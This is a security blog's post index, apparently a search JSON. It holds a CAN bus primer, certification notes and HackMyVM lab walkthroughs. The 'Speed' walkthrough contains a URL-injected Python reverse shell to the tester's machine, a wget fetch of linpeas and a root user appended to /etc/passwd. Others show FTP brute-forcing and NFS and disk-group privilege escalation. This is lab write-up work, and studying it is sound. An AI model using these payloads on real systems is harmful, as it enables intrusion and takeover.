the bus to a dominant state (zero), no other node can change it back to a resistive state (one) until all nodes agree to be in the resistive state. The bus status will only become one when all three nodes transmit a one in the last bit.In conclusion, data transmission on the CAN bus involves utilizing resistive and dominant states. Nodes compete for access to the bus based on their message identifiers, with the node possessing the highest-priority identifier winning the arbitration. This process ensures orderly communication on the bus, and the bus status is controlled by wire and logic rules.Understanding CAN Data Frames and Remote FramesIn the CAN protocol, it’s important to distinguish between CAN data frames and CAN remote frames as they serve different purposes. Let’s explore the characteristics and differences of these two frame types.A CAN data frame is responsible for carrying actual data and facilitating information exchange between nodes on the CAN bus. It encapsulates various types of data, such as power window status, temperature readings, or other relevant information. The data frame comprises a data field that stores this information.On the other hand, a CAN remote frame does not contain a data field. Its primary function is to request specific data from other nodes. It’s analogous to raising a hand and asking for information. The remote frame acts as an initiation for communication, indicating a desire for certain data.To illustrate this distinction, let’s consider an example where an air conditioning node in a car wants to inquire about the status of the power windows. To obtain this information, the air conditioning node generates a dedicated request frame for the power windows. This request frame is then transmitted across the CAN bus.Upon receiving the request frame, the power windows node recognizes that the air conditioning node is seeking information about the power windows. As a response, the power windows node generates a data frame containing the relevant data, such as the current state of the windows (open or closed). This data frame is transmitted on the CAN bus, received by the air conditioning node, and fulfills its request.In summary, the key distinction between a CAN data frame and a CAN remote frame lies in their purposes. While a data frame carries actual data exchanged between nodes, a remote frame serves as a request for data. Additionally, there is a difference in the value of the arbitration field between the two frame types. In a data frame, the arbitration field is dominant (zero), whereas in a remote frame, it is recessive (one).The OBD-II ConnectorMost vehicles are equipped with an OBD-II connector, also known as the diagnostic link connector (DLC), which connects to the internal network of the vehicle. These connectors are typically located under the steering column or discreetly placed on the dashboard. They may be concealed behind access panels and can be either black or white in color. While some OBD-II connectors are easily accessible, others may be tucked away under plastic covers.ConclusionIn conclusion, the CAN Bus Protocol is a vital communication protocol in modern vehicles that enables seamless interaction between different components. By utilizing a message-based approach and standardized data frames, the CAN protocol ensures reliable and efficient data transmission. With its features of easy node addition and removal, independent operation, broadcast communication, and message-based interaction, the CAN protocol offers flexibility, scalability, and resilience. Understanding the CAN Bus Protocol is essential for automotive penetration testers to identify vulnerabilities, analyze network behavior, and contribute to securing vehicles in the digital age." }, { "title": "Attacking and Defending Active Directory Lab Course", "url": "/posts/CRTP/", "categories": "Blogs", "tags": "CRTP", "date": "2022-05-04 18:50:00 +0800", "snippet": "OverviewRecently took on the CRTP course and passed the exam ! Definitely a great introductory course to learn more about the approach of attacking and defending Active Directory.Some review that goes in depth to what you can expect from the course. https://steflan-security.com/certified-red-team-professional-crtp-review/ https://casvancooten.com/posts/2020/10/getting-the-crtp-certification-attacking-and-defending-active-directory-course-review/Cheatsheet:https://github.com/jwardsmith/Active-Directory-ExploitationIf you are like me and prefer to “pre-study” before taking any course (OSCP woes), I recommend setting up a simple lab to have a hands on approach. Wrote a simple guide to on doing so: https://am-a-circle.gitbook.io/rhea-horizon-v0.1/Onwards to CRTE next (Probably taking a long break first!)" }, { "title": "Goals", "url": "/posts/goals/", "categories": "Goal Setting", "tags": "redteam", "date": "2022-04-03 13:53:00 +0800", "snippet": "OverviewWanted to write down a self-goal setting, the aim is to improve my red team skills to understand more about Active Directory Enumeration, using C2 ,perform advanced penetration tests against mature organizations with an established security function and exploitation skills needed to crack the critical security mitigations protecting enterprises.Note taking will probably be move to gitbook or some other platform. Here remains more for walk through of machine! A big reminder to myself that this isn’t a sprint. It’s a longmarathon, so lets take it steadily.Red team certification to take: Pentester Academy: Certified Red Team Professional (CRTP) Pentester Academy: Certified Red Team Expert (CRTE) PentesterAcademy: Certified Enterprise Security Specialist (PACES) Zero Point Security : Certified Red Team Operator (CRTO)Challenges : HTB: Offshore HTB: RastaLabsBeyond: Offensive Security : Pen-300 Evasion Techniques and Breaching Defenses Offensive Security : EXP-301 Windows User Mode Exploit DevelopmentThe order and timelineCRTP(2-3 Months) -&amp;gt; CRTE (Just do the exam) -&amp;gt; PACES (2-3 Months) + HTB: Offshore + HTB: RastaLabs-&amp;gt; Certified Red Team Operator (CRTO) (2-3 Months) -&amp;gt; OSEP" }, { "title": "zday", "url": "/posts/zday/", "categories": "hackmyvm, hardd", "tags": "no_root_squash", "date": "2022-03-26 09:00:00 +0800", "snippet": "OverviewRated as difficult , but you just gotta enumerate more! Probaly hard because of the rabbit holes . Box Difficulty Link Hard HackmyVM Recon┌──(root💀kali)-[/opt/hackmyv/zday] └─# nmap -sVC -Pn -p 111,2049,21,22,3306,33393,39811,443,51765,56261,80 192.168.56.73 Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-25 06:20 EDT Nmap scan report for 192.168.56.73 Host is up (0.00033s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 ee:01:82:dc:7a:00:0e:0e:fc:d9:08:ca:d8:7e:e5:2e (RSA) | 256 44:af:47:d8:9f:ea:ae:3e:9f:aa:ec:1d:fb:22:aa:0f (ECDSA) |_ 256 6a:fb:b4:13:64:df:6e:75:b2:b9:4e:f1:92:97:72:30 (ED25519) 80/tcp open http Apache httpd 2.4.38 ((Debian)) |_http-server-header: Apache/2.4.38 (Debian) |_http-title: Apache2 Debian Default Page: It works 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind| 100003 3 2049/udp nfs| 100003 3 2049/udp6 nfs| 100003 3,4 2049/tcp nfs| 100003 3,4 2049/tcp6 nfs| 100005 1,2,3 34997/tcp6 mountd| 100005 1,2,3 38351/udp6 mountd| 100005 1,2,3 39811/tcp mountd| 100005 1,2,3 56988/udp mountd| 100021 1,3,4 33393/tcp nlockmgr| 100021 1,3,4 37949/tcp6 nlockmgr| 100021 1,3,4 53093/udp nlockmgr| 100021 1,3,4 57780/udp6 nlockmgr| 100227 3 2049/tcp nfs_acl| 100227 3 2049/tcp6 nfs_acl| 100227 3 2049/udp nfs_acl|_ 100227 3 2049/udp6 nfs_acl443/tcp open http Apache httpd 2.4.38|_http-server-header: Apache/2.4.38 (Debian)|_http-title: Apache2 Debian Default Page: It works2049/tcp open nfs_acl 3 (RPC #100227)3306/tcp open mysql MySQL 5.5.5-10.3.27-MariaDB-0+deb10u1| mysql-info: | Protocol: 10| Version: 5.5.5-10.3.27-MariaDB-0+deb10u1| Thread ID: 93| Capabilities flags: 63486| Some Capabilities: SupportsLoadDataLocal, DontAllowDatabaseTableColumn, IgnoreSigpipes, Support41Auth, Speaks41ProtocolOld, Speaks41ProtocolNew, InteractiveClient, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, SupportsCompression, SupportsTransactions, LongColumnFlag, ODBCClient, FoundRows, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins| Status: Autocommit| Salt: nDFs1:k2R)r(kb-VLXW*|_ Auth Plugin Name: mysql_native_password33393/tcp open nlockmgr 1-4 (RPC #100021)39811/tcp open mountd 1-3 (RPC #100005)51765/tcp open mountd 1-3 (RPC #100005)56261/tcp open mountd 1-3 (RPC #100005)MAC Address: 08:00:27:10:C2:72 (Oracle VirtualBox virtual NIC)Service Info: Host: 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 12.24 secondsOkay, there’s really alot of ports! Begin enumeration.HTTP- TCP 80Website Enum:┌──(root💀kali)-[/opt]└─# gobuster dir -u http://192.168.56.73:80 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -e -k -s 200,204,301,302,307,403,500 -x txt,html,php,jsp -o gobuster_p80.txt===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.56.73:80[+] Method: GET[+] Threads: 100[+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Extensions: txt,html,php,jsp[+] Expanded: true[+] Timeout: 10s===============================================================2022/03/25 06:14:32 Starting gobuster in directory enumeration mode===============================================================http://192.168.56.73:80/index.php (Status: 302) [Size: 0] [--&amp;gt; /fog/index.php]http://192.168.56.73:80/index.html (Status: 200) [Size: 10701] http://192.168.56.73:80/fog (Status: 301) [Size: 312] [--&amp;gt; http://192.168.56.73/fog/]http://192.168.56.73:80/server-status (Status: 403) [Size: 278] ===============================================================2022/03/25 06:19:46 Finished===============================================================Enumerating it we can see it host Fog project.Default credentials can be found from the wiki page:and we are in!Did found an exploit to do file upload + rce however that was a dead end for me :(┌──(root💀kali)-[/opt]└─# searchsploit fog -------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Fog Creek Software FogBugz 4.0 29 - &#39;default.asp&#39; Cross-Site Scripting | asp/webapps/27071.txtFOG Forum 0.8.1 - Multiple Local File Inclusions | php/webapps/5784.txtFOGProject 1.5.9 - File Upload RCE (Authenticated) | php/webapps/49811.txt-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No ResultsPapers: No ResultsInstead, further enumeration found that we have a password that we can reuse:Shell as fogprojectLooks like we can’t ssh into the server because of some configuration but FTP is possible:What is interesting here is that we are probably in the fogproject home folder.So there’s probably a script in one of those file that stopping us from getting a shell, and that scripts is found in .bashrcWhat is .bashrc: The .bashrc file is a script file that’s executed when a user logs in.The file itself contains a series of configurations for the terminalsession.Let’s download the .bashrc and see what is inside:exit 1 is seen at the end of the script. Remove the line and upload the file back. Retry SSH.And this time we are logged in as fogproject!Shell as RootRunning linpeas, we can exploit the NFS weak system configuration as there is no_root_squash , basically means whatever in a writable share configuration, a remote user who identifies as “root” can create files on the NFS share as the local root user.Let’s mount the folder and upload an exploit to make us root:Rooted :)" }, { "title": "Satori", "url": "/posts/satori/", "categories": "hackmyvm, mediumm", "tags": "OSINT, Disk Group", "date": "2022-03-19 12:00:00 +0800", "snippet": "OverviewA vulnerable machine that is very OSCP like. Think outside the box, enumerate at places you don’t usually do and understanding of exploiting the vulnerability to do a LFI. Box Difficulty Link Medium HackmyVM Recon┌──(root💀kali)-[/opt/hackmyv/satori]└─# masscan -p1-65535,U:1-65535 192.168.56.69 --rate=1000 Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-03-19 12:44:43 GMTInitiating SYN Stealth ScanScanning 1 hosts [131070 ports/host]Discovered open port 80/tcp on 192.168.56.69 Discovered open port 21/tcp on 192.168.56.69 Discovered open port 22/tcp on 192.168.56.69 Enumerate ports that were found to be open:┌──(root💀kali)-[/opt/hackmyv/satori]└─# nmap -sVC -Pn -p 21,22,80 192.168.56.69Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-19 08:48 EDTNmap scan report for 192.168.56.69Host is up (0.00010s latency).PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.3| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_-rwxrwxrwx 1 0 0 10296404 Mar 03 2021 satori.mkv [NSE: writeable]| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:192.168.56.70| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 4| vsFTPd 3.0.3 - secure, fast, stable|_End of status22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 fd:07:48:a4:a2:91:7d:bf:e8:2c:2d:39:7d:21:fe:8a (RSA)| 256 d5:f1:45:5d:d4:3e:2e:63:25:e3:0e:d0:21:0d:23:15 (ECDSA)|_ 256 e8:78:20:63:0d:23:2f:83:42:8f:14:68:c1:24:32:e4 (ED25519)80/tcp open http nginx 1.14.2|_http-title: youtube-downloader|_http-server-header: nginx/1.14.2MAC Address: 08:00:27:7E:43:28 (Oracle VirtualBox virtual NIC)Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 8.16 secondsWe can see that there is an anonymous account on the FTP server.Additionally, http is hosting a nginx 1.14.2, application called youtube-downloader.Begin enumeration.FTP - TCP 21Enumerate the anonymous FTP account to find a .mkv. Honestly, a dead end which shows an interesting video if you get there :) However, further enumeration shows nothing interesting.┌──(root💀kali)-[/opt/hackmyv/satori]└─# ftp anonymous@192.168.56.69 Connected to 192.168.56.69.220 (vsFTPd 3.0.3)331 Please specify the password.Password: 230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&amp;gt; dir229 Entering Extended Passive Mode (|||21604|)150 Here comes the directory listing.-rwxrwxrwx 1 0 0 10296404 Mar 03 2021 satori.mkv226 Directory send OK.ftp&amp;gt; get satori.mkvlocal: satori.mkv remote: satori.mkv229 Entering Extended Passive Mode (|||55943|)150 Opening BINARY mode data connection for satori.mkv (10296404 bytes).100% |*********************************************************************************************************************************************************| 10055 KiB 218.87 MiB/s 00:00 ETA226 Transfer complete.10296404 bytes received in 00:00 (217.63 MiB/s)ftp&amp;gt; exit221 Goodbye. ┌──(root💀kali)-[/opt/hackmyv/satori]└─# ls -la total 10072drwxr-xr-x 2 root root 4096 Mar 19 08:50 .drwxr-xr-x 3 root root 4096 Mar 19 08:43 ..-rw-r--r-- 1 root root 10296404 Mar 3 2021 satori.mkvHTTP- TCP 80Website Enum:┌──(root💀kali)-[/opt/hackmyv/satori]└─# gobuster dir -u http://192.168.56.69:80 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -e -k -s &quot;200,204,301,302,307,403,500&quot; -x &quot;txt,html,php,jsp&quot; -o gobuster_p80.txt===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.56.69:80[+] Method: GET[+] Threads: 100[+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Extensions: txt,html,php,jsp[+] Expanded: true[+] Timeout: 10s===============================================================2022/03/19 08:48:06 Starting gobuster in directory enumeration mode===============================================================http://192.168.56.69:80/index.html (Status: 200) [Size: 1739]http://192.168.56.69:80/stream.php (Status: 200) [Size: 15] ===============================================================2022/03/19 08:49:24 Finished===============================================================We can see a Youtube Downloader application from here.Further enumeration shows that there exist a SSRF vulnerability :POC:Great we got a SSRF! From Hacktricks , we know that we can try to read the localhost File by supplying the below:After enumerating the /etc/passwd file there is only a user called yana .Shell as YanaTrying to SSH into yana show’s that we need its publickey to access the server.┌──(root💀kali)-[/opt/hackmyv/satori]└─# ssh yana@192.168.56.69 The authenticity of host &#39;192.168.56.69 (192.168.56.69)&#39; can&#39;t be established.ED25519 key fingerprint is SHA256:qOlHItKY4wk+MzNIJgzvdD3C17EaDA1k/uYmSNfmhAk.This key is not known by any other namesAre you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added &#39;192.168.56.69&#39; (ED25519) to the list of known hosts.yana@192.168.56.69: Permission denied (publickey).Enumerating the FTP server with user yana allow us to find the password through a bruteforce attack!┌──(root💀kali)-[/opt/hackmyv/satori]└─# hydra -t 64 -l yana -P /usr/share/wordlists/rockyou.txt 192.168.56.69 ftp Hydra v9.3 (c) 2022 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-03-19 09:31:09[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task[DATA] attacking ftp://192.168.56.69:21/[21][ftp] host: 192.168.56.69 login: yana password: XXXXX1 of 1 target successfully completed, 1 valid password found[WARNING] Writing restore file because 10 final worker threads did not complete until end.[ERROR] 10 targets did not resolve or could not be connected[ERROR] 0 target did not completeHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-03-19 09:31:59Enumerating the ftp server shows what we a need, a id_rsa under the .ssh server.Download the file and we are in!┌──(root💀kali)-[/opt/hackmyv/satori]└─# chmod 600 id_rsa ┌──(root💀kali)-[/opt/hackmyv/satori]└─# ssh yana@192.168.56.69 -i id_rsa Linux satori 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Wed Mar 3 06:25:56 2021 from 192.168.1.58yana@satori:~$ Shell as RootRunning linpeas shows that user yana is under the Disk group which has a common privs escalation technique! Based on hacktricks: This privilege is almost equivalent to root access as you canaccess all the data inside of the machine.Note that using debugfs you can also write files. For example to copy /tmp/asd1.txt to /tmp/asd2.txt.Execute the vulnerability and enumerate, we find a private key for the root user:Rooted:" }, { "title": "Speed", "url": "/posts/speed/", "categories": "hackmyvm, mediumm", "tags": "CVE", "date": "2022-03-15 10:00:00 +0800", "snippet": "OverviewFun box that requires you to search for available exploits. Box Difficulty Link Medium HackmyVM Recon┌──(root💀kali)-[/opt/hackmyv/speed]└─# masscan -p1-65535,U:1-65535 192.168.56.66 --rate=1000 Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-03-14 06:21:40 GMTInitiating SYN Stealth ScanScanning 1 hosts [131070 ports/host]Discovered open port 22/tcp on 192.168.56.66 Discovered open port 7080/tcp on 192.168.56.66 Discovered open port 80/tcp on 192.168.56.66 Discovered open port 8088/tcp on 192.168.56.66 Enumerate ports that were found to be open:┌──(root💀kali)-[/opt/hackmyv/speed]└─# nmap -sVC -Pn -p22,80,7080,8088 192.168.56.66 Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-14 02:26 EDTNmap scan report for 192.168.56.66Host is up (0.00036s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 fe:07:9a:67:7f:8a:63:a7:48:46:46:bb:78:83:4e:d5 (RSA)| 256 5e:9b:35:e4:82:5f:eb:01:9b:6a:7b:cc:5b:16:00:4f (ECDSA)|_ 256 67:85:3b:a2:fb:3b:d0:d0:6b:45:a0:ae:2d:ac:1b:e9 (ED25519)80/tcp open http nginx 1.14.2|_http-server-header: nginx/1.14.2|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).| http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set7080/tcp open ssl/http LiteSpeed httpd| tls-alpn: | h2| spdy/3| spdy/2|_ http/1.1|_ssl-date: TLS randomness does not represent time| ssl-cert: Subject: commonName=speed/organizationName=webadmin/countryName=US| Not valid before: 2021-02-17T08:51:38|_Not valid after: 2023-02-17T08:51:38| http-title: LiteSpeed WebAdmin Console|_Requested resource was https://192.168.56.66:7080/login.php|_http-server-header: LiteSpeed8088/tcp open http LiteSpeed httpd|_http-server-header: LiteSpeed|_http-title: WelcomeMAC Address: 08:00:27:C7:F3:2F (Oracle VirtualBox virtual NIC)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 24.88 secondsBegin enumeration.HTTP- TCP 80┌──(root💀kali)-[/opt/hackmyv/speed]└─# gobuster dir -u http://192.168.56.66:80 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -e -k -s &quot;200,204,301,302,307,403,500&quot; -x &quot;txt,html,php,jsp&quot; -o gobuster_p80.txt===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.56.66:80[+] Method: GET[+] Threads: 100[+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Extensions: html,php,jsp,txt[+] Expanded: true[+] Timeout: 10s===============================================================2022/03/14 02:22:18 Starting gobuster in directory enumeration mode===============================================================http://192.168.56.66:80/index.php (Status: 200) [Size: 4816]http://192.168.56.66:80/LICENSE (Status: 200) [Size: 35149] ===============================================================2022/03/14 02:24:08 Finished===============================================================Found sar2html version 3.2.2. hosted on port 80:Searchsploit shows there’s a RCE:┌──(root💀kali)-[/opt/hackmyv/speed]└─# searchsploit sar2html -------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------sar2html 3.2.1 - &#39;plot&#39; Remote Code Execution | php/webapps/49344.pySar2HTML 3.2.1 - Remote Command Execution | php/webapps/47204.txt-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No ResultsPapers: No ResultsAttempting exploit we can see that we are www-data:Port 7080:┌──(root💀kali)-[/opt/hackmyv/speed]└─# gobuster dir -u https://192.168.56.66:7080/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -e -k -s &quot;200,204,301,302,307,500&quot; -b &quot;403,404&quot; -x &quot;txt,html,php&quot; ===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: https://192.168.56.66:7080/[+] Method: GET[+] Threads: 100[+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt[+] Negative Status codes: 403,404[+] User Agent: gobuster/3.1.0[+] Extensions: txt,html,php[+] Expanded: true[+] Timeout: 10s===============================================================2022/03/14 02:44:30 Starting gobuster in directory enumeration mode===============================================================https://192.168.56.66:7080/docs (Status: 301) [Size: 1260] [--&amp;gt; https://192.168.56.66:7080/docs/]https://192.168.56.66:7080/login.php (Status: 200) [Size: 7076] https://192.168.56.66:7080/index.php (Status: 302) [Size: 0] [--&amp;gt; /login.php] https://192.168.56.66:7080/view (Status: 301) [Size: 1260] [--&amp;gt; https://192.168.56.66:7080/view/]https://192.168.56.66:7080/lib (Status: 301) [Size: 1260] [--&amp;gt; https://192.168.56.66:7080/lib/] https://192.168.56.66:7080/res (Status: 301) [Size: 1260] [--&amp;gt; https://192.168.56.66:7080/res/] ===============================================================2022/03/14 02:47:12 Finished===============================================================Running OpenLiteSPeed on port 7080:Version 1.5:A quick searchploit shows authenticated command injection is possible(?)┌──(root💀kali)-[~]└─# searchsploit openlitespeed-------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------OpenLitespeed 1.3.9 - Use-After-Free (Denial of Service) | linux/dos/37051.cOpenlitespeed 1.7.9 - &#39;Notes&#39; Stored Cross-Site Scripting | multiple/webapps/49727.txtOpenlitespeed Web Server 1.7.8 - Command Injection (Authenticated) (1) | multiple/webapps/49483.txtOpenlitespeed WebServer 1.7.8 - Command Injection (Authenticated) (2) | multiple/webapps/49556.py-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No ResultsPapers: No ResultsShell as www-dataBack at port 80, use the command injection to connect back to victim machine using reverse shell.http://192.168.56.66/index.php?plot=;export%20RHOST=%22192.168.56.37%22;export%20RPORT=4242;python3%20-c%20%27import%20sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(%22RHOST%22),int(os.getenv(%22RPORT%22))));%5Bos.dup2(s.fileno(),fd)%20for%20fd%20in%20(0,1,2)%5D;pty.spawn(%22/bin/bash%22)%27](http://192.168.56.66/index.php?plot=;export%20RHOST=%22192.168.56.37%22;export%20RPORT=4242;python3%20-c%20%27import%20sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(%22RHOST%22),int(os.getenv(%22RPORT%22))));%5Bos.dup2(s.fileno(),fd)%20for%20fd%20in%20(0,1,2)%5D;pty.spawn(%22/bin/bash%22)%27)┌──(root💀kali)-[/opt/hackmyv/speed]└─# nc -lvnp 4242 listening on [any] 4242 ...connect to [192.168.56.37] from (UNKNOWN) [192.168.56.66] 36936www-data@speed:~/html$ whoamiwhoamiwww-datawww-data@speed:~/html$ ididuid=33(www-data) gid=33(www-data) groups=33(www-data)www-data@speed:~/html$ Enumerate:www-data@speed:/home$ cd /tmpcd /tmpwww-data@speed:/tmp$ wget 192.168.56.37:1235/linpeas.shwget 192.168.56.37:1235/linpeas.sh--2022-03-14 03:00:34-- http://192.168.56.37:1235/linpeas.shConnecting to 192.168.56.37:1235... connected.HTTP request sent, awaiting response... 200 OKLength: 330173 (322K) [text/x-sh]Saving to: ‘linpeas.sh’linpeas.sh 100%[===================&amp;gt;] 322.43K --.-KB/s in 0.003s 2022-03-14 03:00:34 (125 MB/s) - ‘linpeas.sh’ saved [330173/330173]www-data@speed:/tmp$ chmod +x linpeas.shchmod +x linpeas.sh.......[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files /dev/mqueue /dev/shm /opt/openlitespeed/install.sh/run/lock /run/php /tmp /tmp/.ICE-unix /tmp/.Test-unix /tmp/.X11-unix /tmp/.XIM-unix /tmp/.font-unix #)You_can_write_even_more_files_inside_last_directory /usr/local/lsws/adminpasswd /var/lib/nginx/body/var/lib/nginx/fastcgi/var/lib/nginx/proxy/var/lib/nginx/scgi/var/lib/nginx/uwsgi/var/lib/php/sessions/var/log/nginx/access.log/var/log/nginx/error.log/var/tmp /usr/local/lsws/adminpasswdwww-data@speed:/tmp$ cat /usr/local/lsws/adminpasswd cat /usr/local/lsws/adminpasswd WebAdmin user/password is admin/MjE0MGU2Shell as RootTry to execute exploit previously found: https://www.exploit-db.com/exploits/49483┌──(root💀kali)-[/opt/hackmyv/speed]└─# nc -lvnp 4240 listening on [any] 4240 ...connect to [192.168.56.37] from (UNKNOWN) [192.168.56.66] 37312bash: cannot set terminal process group (621): Inappropriate ioctl for devicebash: no job control in this shellnobody@speed:/usr/bin$ whoami;id;whoami;id;nobodyuid=65534(nobody) gid=0(root) groups=0(root)nobody@speed:/usr/bin$ cd /rootcd /rootbash: cd: /root: Permission deniednobody@speed:/usr/bin$ Add a user in /etc/passwd which can run as root:nobody@speed:/usr/bin$ openssl passwd tempuseropenssl passwd tempuser5GF7zLF6O5uwgnobody@speed:/usr/bin$ echo &quot;user3:5GF7zLF6O5uwg:0:0:/root/root:/bin/bash&quot; &amp;gt;&amp;gt; /etc/passwd&amp;lt;7zLF6O5uwg:0:0:/root/root:/bin/bash&quot; &amp;gt;&amp;gt; /etc/passwdnobody@speed:/usr/bin$ su user3su user3Password: tempuserwhoamirootiduid=0(root) gid=0(root) groups=0(root)cd /rootls -latotal 32drwx------ 3 root root 4096 Feb 17 2021 .drwxr-xr-x 18 root root 4096 Feb 17 2021 ..-rw-r--r-- 1 root root 570 Jan 31 2010 .bashrc-rwx--x--x 1 root root 1920 Feb 17 2021 flag.shdrwxr-xr-x 3 root root 4096 Feb 17 2021 .local-rw-r--r-- 1 root root 148 Aug 17 2015 .profile-rw------- 1 root root 18 Feb 17 2021 root.txt-rw-r--r-- 1 root root 66 Feb 17 2021 .selected_editor" }, { "title": "Dominator", "url": "/posts/dominator/", "categories": "hackmyvm, easyy", "tags": "DNS, systemctl", "date": "2022-02-14 15:04:00 +0800", "snippet": "Overview Box Difficulty Link Easy hackmyvm Link ReconTCP Ports:┌──(root💀kali)-[/opt/hackmyv/dominator]└─# masscan -p1-65535,U:1-65535 192.168.56.53 --rate=1000 Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-02-14 04:09:07 GMTInitiating SYN Stealth ScanScanning 1 hosts [131070 ports/host]Discovered open port 53/udp on 192.168.56.53 Discovered open port 53/tcp on 192.168.56.53 Discovered open port 65222/tcp on 192.168.56.53 Discovered open port 80/tcp on 192.168.56.53 UDP Ports:┌──(root💀kali)-[/opt/hackmyv/dominator]└─# nmap -sUV -T4 -F --version-intensity 0 192.168.56.53Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-13 23:10 ESTWarning: 192.168.56.53 giving up on port because retransmission cap hit (6).Nmap scan report for 192.168.56.53Host is up (0.0034s latency).Not shown: 55 closed udp ports (port-unreach), 44 open|filtered udp ports (no-response)PORT STATE SERVICE VERSION53/udp open domain (unknown banner: not currently available)MAC Address: 08:00:27:9B:F4:CF (Oracle VirtualBox virtual NIC)Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 67.95 secondsEnumerate ports that were found to be open:┌──(root💀kali)-[/opt/hackmyv/dominator]└─# nmap -sVC -Pn -p 53,80,65222 192.168.56.53 Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-13 23:12 ESTStats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service ScanService scan Timing: About 33.33% done; ETC: 23:12 (0:00:12 remaining)Nmap scan report for 192.168.56.53Host is up (0.0039s latency).PORT STATE SERVICE VERSION53/tcp open domain (unknown banner: not currently available)| fingerprint-strings: | DNSVersionBindReqTCP: | version| bind|_ currently available| dns-nsid: |_ bind.version: not currently available80/tcp open http Apache httpd 2.4.38 ((Debian))|_http-title: Apache2 Debian Default Page: It works|_http-server-header: Apache/2.4.38 (Debian)65222/tcp open ssh 